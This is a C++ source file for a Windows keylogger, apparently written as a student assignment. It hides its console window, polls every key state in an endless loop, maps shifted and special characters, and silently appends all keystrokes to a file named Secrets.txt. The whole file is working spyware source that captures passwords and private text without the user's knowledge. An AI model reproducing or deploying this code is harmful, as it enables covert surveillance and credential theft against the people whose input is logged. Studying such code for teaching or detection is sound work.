// Simple_KeyLogger_Assignment.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <WinUser.h>
#include <fstream>
#include <iostream>
#include <string>

using namespace std;
//hide the app window
void hideAppWindow() {
	HWND consoleWindow = GetConsoleWindow();
	//AllocConsole();
	//consoleWindow = FindWindowA("", NULL);
	ShowWindow(consoleWindow, 0);
}


int main() {
	//hide the app window
	hideAppWindow();
	int keyPressed;
	char* keyPressedPlaceholder = NULL;

	std::ofstream secrets("Secrets.txt", std::ios::app);


	while (true) {

		Sleep(0);
		for (keyPressed = 0; keyPressed < 256; keyPressed += 1) {
			if (GetAsyncKeyState(keyPressed) == -32767)
			{
				//SHIFT
				if (keyPressed >= 65 && keyPressed <= 90)
				{ 
					if (!GetAsyncKeyState(VK_SHIFT)) {
						keyPressed += 32;
						//secrets << (char)keyPressed;
					}
					else {
						secrets << (char)keyPressed;
					}
				}
		
				//CAPS
				if (keyPressed >= 97 && keyPressed <= 122) {
					if (GetKeyState(VK_CAPITAL)) {
						keyPressed -= 32;
						secrets << (char)keyPressed;
					}
					else {
						secrets << (char)keyPressed;
					}
				}

				//TAB, DELETE, ESCAPE, ENTER, SPACE
				if (GetAsyncKeyState(VK_TAB)) {
					secrets << "[TAB]";
				}
				if (GetAsyncKeyState(VK_DELETE)) {
					secrets << "[DEL]";
				}
				if (GetAsyncKeyState(VK_ESCAPE)) {
					secrets << "[ESC]";
				}
				if (GetAsyncKeyState(VK_RETURN)) {
					secrets << "[ENTER]";
				}
				if (GetAsyncKeyState(VK_SPACE)) {
					secrets << "[SPACE]";
				}

				//special chars generated by SHIFT + numeric simbols
				if (keyPressed >= 48 && keyPressed <= 57) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						switch (keyPressed) {
							//0 
						case 48:
							keyPressed -= 7; // )
							break;
							//1
						case 49:
							keyPressed -= 16; // !
							break;
							//2
						case 50:
							keyPressed += 14; // @
							break;
							//3
						case 51:
							keyPressed -= 16; // #
							break;
							//4
						case 52:
							keyPressed -= 16; // $
							break;
							//5
						case 53:
							keyPressed -= 16; // %
							break;
							//6
						case 54:
							keyPressed += 40; // ^
							break;
							//7
						case 55:
							keyPressed -= 17; // &
							break;
							//8
						case 56:
							keyPressed -= 14; // *
							break;
							//9
						case 57:
							keyPressed -= 17; // (
							break;
						}
						secrets << (char)keyPressed;
					}
					else {
						secrets << (char)keyPressed;
					}

				}
				// special chars like [ ] ; ' , . / \ - = and their SHIFT combination _ + { } : " < > ?
				// ;:
				if (GetAsyncKeyState(VK_OEM_1)) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						secrets << ":";
					}
					else {
						secrets << ";";
					}
				}
				// =+
				if (GetAsyncKeyState(VK_OEM_PLUS)) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						secrets << "+";
					}
					else {
						secrets << "=";
					}
				}
				// ,<
				if (GetAsyncKeyState(VK_OEM_COMMA)) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						secrets << "<";
					}
					else {
						secrets << ",";
					}
				}
				//-_
				if (GetAsyncKeyState(VK_OEM_MINUS)) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						secrets << "_";
					}
					else {
						secrets << "-";
					}
				}
				// .>
				if (GetAsyncKeyState(VK_OEM_PERIOD)) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						secrets << ">";
					}
					else {
						secrets << ".";
					}
				}
				// /?
				if (GetAsyncKeyState(VK_OEM_2)) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						secrets << "?";
					}
					else {
						secrets << "/";
					}
				}
				//`~
				if (GetAsyncKeyState(VK_OEM_3)) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						secrets << "~";
					}
					else {
						secrets << "`";
					}
				}
				 // [{
				if (GetAsyncKeyState(VK_OEM_4)) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						secrets << "{";
					}
					else {
						secrets << "[";
					}
				} 
				//\|
				if (GetAsyncKeyState(VK_OEM_5)) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						secrets << "|";
					}
					else {
						secrets << "\\";
					}
				}
				//]}
				if (GetAsyncKeyState(VK_OEM_6)) {
					if (GetAsyncKeyState(VK_SHIFT)) {
						secrets << "}";
					}
					else {
						secrets << "]";
					}
				}

				//upper arrows and left + right ones
				if (GetAsyncKeyState(VK_UP)) {
					secrets << "[UP]";
				}
				if (GetAsyncKeyState(VK_DOWN)) {
					secrets << "[DOWN]";
				}
				if (GetAsyncKeyState(VK_LEFT)) {
					secrets << "[LEFT]";
				}
				if (GetAsyncKeyState(VK_RIGHT)) {
					secrets << "[RIGHT]";
				}
				secrets.flush();

			}

		}

	}
}


